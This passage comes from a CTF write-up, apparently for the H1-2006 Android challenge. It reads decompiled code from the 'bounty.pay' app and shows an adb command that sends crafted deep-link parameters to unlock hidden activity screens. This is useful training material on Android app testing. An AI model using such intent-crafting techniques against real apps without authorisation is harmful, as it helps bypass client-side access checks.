<li>Currently invisible.</li>
<li>Visible with the right params.</li>
</ul>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2022.49.08.png" /></p>
<p>This seems to imply that there is some invisible content that will be revealed if we send the right parameters. Let's look at the code.</p>
<div class="highlight"><span class="filename">PartTwoActivity.java</span><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="w">  </span><span class="o">[</span><span class="p">...</span><span class="o">]</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">  </span><span class="n">editText</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">  </span><span class="n">button</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="w">  </span><span class="n">textview</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="w">  </span><span class="o">[</span><span class="p">...</span><span class="o">]</span>
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">settings</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;USERNAME&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="w">    </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span>
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="w">      </span><span class="n">getApplicationContext</span><span class="p">(),</span><span class="w"> </span><span class="s">&quot;Please create a CTF username :)&quot;</span><span class="p">,</span>
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="w">      </span><span class="mi">0</span>
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="w">    </span><span class="p">)</span>
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="w">    </span><span class="p">.</span><span class="na">show</span><span class="p">();</span>
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="w">    </span><span class="n">startActivity</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="w">  </span><span class="p">}</span>
<a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">settings</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;PARTONE&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a><span class="w">    </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span>
<a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="w">      </span><span class="n">getApplicationContext</span><span class="p">(),</span>
<a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a><span class="w">      </span><span class="s">&quot;Part one not completed!&quot;</span><span class="p">,</span>
<a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="w">      </span><span class="mi">0</span>
<a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="w">    </span><span class="p">)</span>
<a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="w">    </span><span class="p">.</span><span class="na">show</span><span class="p">();</span>
<a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a><span class="w">    </span><span class="n">startActivity</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
<a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a><span class="w">  </span><span class="p">}</span>
<a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getIntent</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a><span class="w">    </span><span class="n">Uri</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">();</span>
<a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">firstParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;two&quot;</span><span class="p">);</span>
<a id="__codelineno-38-27" name="__codelineno-38-27" href="#__codelineno-38-27"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">secondParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;switch&quot;</span><span class="p">);</span>
<a id="__codelineno-38-28" name="__codelineno-38-28" href="#__codelineno-38-28"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">firstParam</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-38-29" name="__codelineno-38-29" href="#__codelineno-38-29"></a><span class="w">      </span><span class="n">firstParam</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;light&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-38-30" name="__codelineno-38-30" href="#__codelineno-38-30"></a><span class="w">      </span><span class="n">secondParam</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-38-31" name="__codelineno-38-31" href="#__codelineno-38-31"></a><span class="w">      </span><span class="n">secondParam</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;on&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-38-32" name="__codelineno-38-32" href="#__codelineno-38-32"></a><span class="w">      </span><span class="n">editText</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-38-33" name="__codelineno-38-33" href="#__codelineno-38-33"></a><span class="w">      </span><span class="n">button</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-38-34" name="__codelineno-38-34" href="#__codelineno-38-34"></a><span class="w">      </span><span class="n">textview</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-38-35" name="__codelineno-38-35" href="#__codelineno-38-35"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-38-36" name="__codelineno-38-36" href="#__codelineno-38-36"></a><span class="w">  </span><span class="p">}</span>
<a id="__codelineno-38-37" name="__codelineno-38-37" href="#__codelineno-38-37"></a><span class="p">}</span>
</code></pre></div>
<p>This time we can see that some conditions are required to be able to see the invisible content:</p>
<ul>
<li>The username needs to be set</li>
<li>Part one needs to be complete</li>
<li>Two parameter are required, <code>two</code> with a value of <code>light</code> and <code>switch</code> with a value of <code>on</code></li>
</ul>
<p>Here again we can do this using adb:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>adb shell am start -W -a android.intent.action.VIEW \
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>-d &quot;two://part?two=light\&amp;switch=on&quot; bounty.pay
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>Starting: Intent { act=android.intent.action.VIEW dat=two://part?two=light&amp;switch=on pkg=bounty.pay }
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>Status: ok
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>Activity: bounty.pay/.PartTwoActivity
<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>ThisTime: 238
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>TotalTime: 238
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>WaitTime: 275
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>Complete
</code></pre></div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>Make sure to escape the <code>&amp;</code> when passing multiple parameters !</p>
</div>
<p>As expected we can now see an input field expecting a <code>Header value</code> and underneath an MD5 hash.</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2022.50.32.png" /></p>
<p>Clicking on the submit button will trigger the <code>submitInfo</code> function. We can see that the header value should start with <code>X-</code> and if so the <code>correctHeader</code> function will be called which in turns will start PartThreeActivity.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">submitInfo</span><span class="p">(</span><span class="n">View</span><span class="w"> </span><span class="n">view</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">post</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">EditText</span><span class="p">)</span><span class="w"> </span><span class="n">findViewById</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">id</span><span class="p">.</span><span class="na">editText</span><span class="p">)).</span><span class="na">getText</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="na">childRef</span><span class="p">.</span><span class="na">addListenerForSingleValueEvent</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ValueEventListener</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onDataChange</span><span class="p">(</span><span class="n">DataSnapshot</span><span class="w"> </span><span class="n">dataSnapshot</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="w">      </span><span class="n">SharedPreferences</span><span class="w"> </span><span class="n">settings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">getSharedPreferences</span><span class="p">(</span>
<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="w">        </span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">KEY_USERNAME</span><span class="p">,</span>
<a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="w">        </span><span class="mi">0</span>
<a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="w">      </span><span class="p">);</span>
<a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="w">      </span><span class="n">SharedPreferences</span><span class="p">.</span><span class="na">Editor</span><span class="w"> </span><span class="n">editor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">settings</span><span class="p">.</span><span class="na">edit</span><span class="p">();</span>
<a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">;</span>
<a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;X-&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">dataSnapshot</span><span class="p">.</span><span class="na">getValue</span><span class="p">())))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a><span class="w">        </span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">logFlagFound</span><span class="p">(</span>
<a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a><span class="w">          </span><span class="n">settings</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;USERNAME&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">),</span>
<a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="w">          </span><span class="n">settings</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;TWITTERHANDLE&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">)</span>
<a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a><span class="w">        </span><span class="p">);</span>
<a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a><span class="w">        </span><span class="n">editor</span><span class="p">.</span><span class="na">putString</span><span class="p">(</span><span class="s">&quot;PARTTWO&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;COMPLETE&quot;</span><span class="p">).</span><span class="na">apply</span><span class="p">();</span>
<a id="__codelineno-40-17" name="__codelineno-40-17" href="#__codelineno-40-17"></a><span class="w">        </span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">correctHeader</span><span class="p">();</span>
<a id="__codelineno-40-18" name="__codelineno-40-18" href="#__codelineno-40-18"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
<a id="__codelineno-40-19" name="__codelineno-40-19" href="#__codelineno-40-19"></a><span class="w">      </span><span class="p">}</span>
<a id="__codelineno-40-20" name="__codelineno-40-20" href="#__codelineno-40-20"></a><span class="w">      </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">this</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Try again! :D&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span>
<a id="__codelineno-40-21" name="__codelineno-40-21" href="#__codelineno-40-21"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-40-22" name="__codelineno-40-22" href="#__codelineno-40-22"></a>
<a id="__codelineno-40-23" name="__codelineno-40-23" href="#__codelineno-40-23"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCancelled</span><span class="p">(</span><span class="n">DatabaseError</span><span class="w"> </span><span class="n">databaseError</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-24" name="__codelineno-40-24" href="#__codelineno-40-24"></a><span class="w">      </span><span class="n">Log</span><span class="p">.</span><span class="na">e</span><span class="p">(</span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">TAG</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;onCancelled&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">databaseError</span><span class="p">.</span><span class="na">toException</span><span class="p">());</span>
<a id="__codelineno-40-25" name="__codelineno-40-25" href="#__codelineno-40-25"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-40-26" name="__codelineno-40-26" href="#__codelineno-40-26"></a><span class="w">  </span><span class="p">});</span>
<a id="__codelineno-40-27" name="__codelineno-40-27" href="#__codelineno-40-27"></a><span class="p">}</span>
<a id="__codelineno-40-28" name="__codelineno-40-28" href="#__codelineno-40-28"></a>
<a id="__codelineno-40-29" name="__codelineno-40-29" href="#__codelineno-40-29"></a><span class="cm">/* access modifiers changed from: private */</span>
<a id="__codelineno-40-30" name="__codelineno-40-30" href="#__codelineno-40-30"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">correctHeader</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-31" name="__codelineno-40-31" href="#__codelineno-40-31"></a><span class="w">  </span><span class="n">startActivity</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">PartThreeActivity</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
<a id="__codelineno-40-32" name="__codelineno-40-32" href="#__codelineno-40-32"></a><span class="p">}</span>
</code></pre></div>
<h3 id="partthreeactivity">PartThreeActivity<a class="headerlink" href="#partthreeactivity" title="Permanent link">&para;</a></h3>
<p>This time the conditions that needs to be met are:</p>
<ul>
<li>First param three should be equal to <code>Base64("PartThreeActivity")</code></li>
<li>Second param switch should be equal to <code>Base64("on")</code></li>
<li>Third param header should be equal to the previously defined header, in our case <code>X-Token</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getIntent</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="w">  </span><span class="n">Uri</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">();</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">firstParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;three&quot;</span><span class="p">);</span>
<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">secondParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;switch&quot;</span><span class="p">);</span>
<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">thirdParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;header&quot;</span><span class="p">);</span>
<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">  </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodeFirstParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">firstParam</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="w">  </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodeSecondParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">secondParam</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">decodedFirstParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">decodeFirstParam</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">);</span>
<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">decodedSecondParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">decodeSecondParam</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">);</span>
<a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="w">  </span><span class="n">AnonymousClass5</span><span class="w"> </span><span class="n">r17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r0</span><span class="p">;</span>
<a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="w">  </span><span class="n">DatabaseReference</span><span class="w"> </span><span class="n">databaseReference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">childRefThree</span><span class="p">;</span>
<a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a><span class="w">  </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bArr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decodeSecondParam</span><span class="p">;</span>
<a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstParam</span><span class="p">;</span>
<a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a><span class="w">  </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bArr2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decodeFirstParam</span><span class="p">;</span>
<a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">secondParam</span><span class="p">;</span>
<a id="__codelineno-41-16" name="__codelineno-41-16" href="#__codelineno-41-16"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">str3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">secondParam</span><span class="p">;</span>
<a id="__codelineno-41-17" name="__codelineno-41-17" href="#__codelineno-41-17"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">secondParam2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">thirdParam</span><span class="p">;</span>
<a id="__codelineno-41-18" name="__codelineno-41-18" href="#__codelineno-41-18"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">str4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstParam</span><span class="p">;</span>
<a id="__codelineno-41-19" name="__codelineno-41-19" href="#__codelineno-41-19"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">EditText</span><span class="w"> </span><span class="n">editText2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">editText</span><span class="p">;</span>
<a id="__codelineno-41-20" name="__codelineno-41-20" href="#__codelineno-41-20"></a><span class="w">  </span><span class="n">Uri</span><span class="w"> </span><span class="n">uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">;</span>
<a id="__codelineno-41-21" name="__codelineno-41-21" href="#__codelineno-41-21"></a><span class="w">  </span><span class="kd">final</span><span class="w"> </span><span class="n">Button</span><span class="w"> </span><span class="n">button2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">button</span><span class="p">;</span>
<a id="__codelineno-41-22" name="__codelineno-41-22" href="#__codelineno-41-22"></a><span class="w">  </span><span class="n">AnonymousClass5</span><span class="w"> </span><span class="n">r0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ValueEventListener</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-23" name="__codelineno-41-23" href="#__codelineno-41-23"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onDataChange</span><span class="p">(</span><span class="n">DataSnapshot</span><span class="w"> </span><span class="n">dataSnapshot</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-24" name="__codelineno-41-24" href="#__codelineno-41-24"></a><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">;</span>
<a id="__codelineno-41-25" name="__codelineno-41-25" href="#__codelineno-41-25"></a><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">dataSnapshot</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span>
<a id="__codelineno-41-26" name="__codelineno-41-26" href="#__codelineno-41-26"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">decodedFirstParam</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;PartThreeActivity&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-41-27" name="__codelineno-41-27" href="#__codelineno-41-27"></a><span class="w">        </span><span class="n">str2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">decodedSecondParam</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;on&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<a id="__codelineno-41-28" name="__codelineno-41-28" href="#__codelineno-41-28"></a><span class="w">        </span><span class="p">(</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">secondParam2</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-29" name="__codelineno-41-29" href="#__codelineno-41-29"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;X-&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-30" name="__codelineno-41-30" href="#__codelineno-41-30"></a><span class="w">          </span><span class="n">editText2</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-41-31" name="__codelineno-41-31" href="#__codelineno-41-31"></a><span class="w">          </span><span class="n">button2</span><span class="p">.</span><span class="na">setVisibility</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
